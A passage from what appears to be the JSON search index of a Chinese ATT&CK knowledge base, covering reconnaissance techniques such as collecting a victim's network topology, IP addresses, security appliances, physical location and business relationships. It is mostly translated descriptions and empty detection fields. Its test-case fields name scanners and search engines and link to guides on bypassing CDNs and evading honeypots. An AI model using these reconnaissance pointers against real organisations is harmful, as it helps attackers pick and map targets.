%91%E7%BB%9C%E6%8B%93%E6%89%91/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-004-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590-004</p> <p>https://attack.mitre.org/techniques/T1590/004/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/","title":"T1590-005-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-IP\u5730\u5740","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684IP\u5730\u5740\u4fe1\u606f\u3002\u516c\u5171IP\u5730\u5740\u53ef\u80fd\u662f\u6309\u5757\u5206\u914d\u7ed9\u4f01\u4e1a\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u7cfb\u5217\u8fde\u7eed\u5730\u5740\u5206\u914d\u7ed9\u4f01\u4e1a\u7684\u3002\u5df2\u5206\u914dIP\u5730\u5740\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u7ec6\u8282\u4fe1\u606f\uff0c\u6bd4\u5982\u5f53\u524d\u4f7f\u7528\u7684IP\u5730\u5740\u3002\u6536\u96c6\u5df2\u5206\u914d\u7684IP\u5730\u5740\u4fe1\u606f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e86\u89e3\u5f53\u524d\u5728\u7528\u7684IP\u5730\u5740\uff0c\u4e5f\u53ef\u80fd\u63a8\u5bfc\u51fa\u653b\u51fb\u76ee\u6807\u7684\u5176\u4ed6\u7ec6\u8282\uff0c\u6bd4\u5982\u7ec4\u7ec7\u89c4\u6a21\u3001\u5730\u7406\u4f4d\u7f6e\u3001Internet\u670d\u52a1\u63d0\u4f9b\u5546\u4ee5\u53ca\u9762\u5411\u516c\u4f17\u57fa\u7840\u8bbe\u65bd\u7684\u90e8\u7f72\u4f4d\u7f6e/\u65b9\u5f0f\u3002</p> <p>IP\u5730\u5740\u4fe1\u606f\u53ef\u80fd\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u7b49\u65b9\u5f0f\u4e3b\u52a8\u6536\u96c6\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\u5982\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u7684\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u626b\u63cf\u5de5\u5177\uff1anmap\u3001goby\u3001masscan\u7b49</p> <p>\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff1afofa\u3001zoomeye\u7b49</p> <p>\u7ed5\u8fc7CDN\u67e5\u627e\u771f\u5b9eIP: https://blog.csdn.net/weixin_45677119/article/details/110870703</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-005-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-IP%E5%9C%B0%E5%9D%80/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590-005</p> <p>https://attack.mitre.org/techniques/T1590/005/</p> <p>\u6e17\u900f\u6d4b\u8bd5-----\u4fe1\u606f\u6536\u96c6\uff08\u901a\u8fc7DNS\u89e3\u6790\u627eIP\u5730\u5740\u3001CDN\u3001IP\u67e5\u8be2\u3001IP\u7269\u7406\u5730\u5740\u3001\u641c\u7d22\u5f15\u64ce\u3001\u7f51\u7ad9\u4fe1\u606f\u6536\u96c6\uff09</p> <p>https://blog.csdn.net/weixin_45677119/article/details/110870703</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/","title":"T1590-006-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u7f51\u7edc\u5b89\u5168\u8bbe\u5907","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4e8b\u5148\u6536\u96c6\u653b\u51fb\u76ee\u6807\u7684\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4fe1\u606f\u3002\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982\u5df2\u90e8\u7f72\u7684\u9632\u706b\u5899\uff0c\u5185\u5bb9\u7b5b\u9009\u5668\u548c\u4ee3\u7406/\u5821\u5792\u4e3b\u673a\u7684\u5b58\u5728\u548c\u8be6\u7ec6\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u9488\u5bf9\u5730\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08NIDS\uff09\u6216\u5176\u4ed6\u4e0e\u9632\u5fa1\u6027\u7f51\u7edc\u5b89\u5168\u64cd\u4f5c\u6709\u5173\u7684\u8bbe\u5907\u7684\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\u6216\u9493\u9c7c\u3002\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4fe1\u606f\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df)\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\uff0c \u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u7ea2\u961f\u5fc5\u5907\uff1aWEB\u871c\u7f50\u8bc6\u522b\u963b\u65ad\u63d2\u4ef6</p> <p>https://www.freebuf.com/articles/web/246938.html</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-006-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1590-006</p> <p>https://attack.mitre.org/techniques/T1590/006/</p> <p>\u7ea2\u961f\u5fc5\u5907\uff1aWEB\u871c\u7f50\u8bc6\u522b\u963b\u65ad\u63d2\u4ef6</p> <p>https://www.freebuf.com/articles/web/246938.html</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/","title":"T1591-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u786e\u5b9a\u7269\u7406\u4f4d\u7f6e","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7684\u5b9e\u9645\u4f4d\u7f6e\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u53ef\u4ee5\u5728\u76ee\u6807\u9501\u5b9a\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u76ee\u6807\u7ec4\u7ec7\u7684\u7269\u7406\u4f4d\u7f6e\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5173\u952e\u8d44\u6e90\u548c\u57fa\u7840\u7ed3\u6784\u7684\u5b58\u653e\u4f4d\u7f6e\u3002\u5b9e\u9645\u4f4d\u7f6e\u8fd8\u53ef\u4ee5\u6307\u793a\u53d7\u5bb3\u8005\u5728\u54ea\u4e2a\u6cd5\u5f8b\u7ba1\u8f96\u533a\u6216\u673a\u6784\u5185\u5de5\u4f5c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u76ee\u6807\u7ec4\u7ec7\u7684\u5b9e\u9645\u4f4d\u7f6e\u4e5f\u53ef\u80fd\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\u6216\u793e\u4ea4\u5a92\u4f53\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9\u6216\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u6216\u521d\u6b65\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u6216\u786c\u4ef6\u6dfb\u52a0\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f8b\u5982\u53d7\u5bb3\u8005\u7684\u4e2a\u4eba\u793e\u4ea4\u4fe1\u606f\uff0c\u5fae\u535a\u3001\u5fae\u4fe1\u3001QQ\u7b49\u3002</p> <p>\u4f8b\u5982\u53d7\u5bb3\u7ec4\u7ec7\u7684\u4f4d\u7f6e\u4fe1\u606f\uff0c\u901a\u8fc7\u5b98\u65b9\u7f51\u7ad9\u5373\u53ef\u67e5\u627e\u5230\u76f8\u5173\u7ec4\u7ec7\u7684\u4f4d\u7f6e\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E7%A1%AE%E5%AE%9A%E7%89%A9%E7%90%86%E4%BD%8D%E7%BD%AE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1591-001</p> <p>https://attack.mitre.org/techniques/T1591/001/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/","title":"T1591-002-\u6536\u96c6\u53d7\u5bb3\u8005\u7ec4\u7ec7\u4fe1\u606f-\u4e1a\u52a1\u5173\u7cfb","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1591-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BB%84%E7%BB%87%E4%BF%A1%E6%81%AF-%E4%B8%9A%E5%8A%A1%E5%85%B3%E7%B3%BB/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u5728\u76ee\u6807\u786e\u5b9a\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5173\u7ec4\u7ec7\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u5df2\u8fde\u63a5\uff08\u5e76\u53ef\u80fd\u63d0\u5347\u4e86\uff09\u7f51\u7edc\u8bbf\u95ee\u6743\u9650\u7684\u7b2c\u4e8c\u6216\u7b2c\u4e09\u65b9\u7ec4\u7ec7\u6216\u57df\uff08\u4f8b\u5982\uff1a\u6258\u7ba1\u670d\u52a1\u63d0\u4f9b\u5546\uff0c\u627f\u5305\u5546\u7b49\uff09\u3002\u6b64\u4fe1\u606f\u8fd8\u53ef\u80fd\u63ed\u793a\u53d7\u5bb3\u8005\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\u8d44\u6e90\u7684\u4f9b\u5e94\u94fe\u548c\u8fd0\u9001\u8def\u5f84\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\u901a\u8fc7\u201c\u7f51\u7edc\u9493\u9c7c\u8bf1\u9a97\u201d\u76f4\u63a5\u8bf1\u6355\u3002\u6709\u5173\u4e1a\u52a1\u5173\u7cfb\u7684\u4fe1\u606f\u4e5f\u53ef\u80fd\u4f1a\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff0c\u793e\u4ea4\u5a92\u4f53\u6216\u53d7\u5bb3\u4eba\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u6b64\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u7f51\u7edc\u9493\u9c7c\u4ee5\u83b7\u53d6\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9\u6216\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\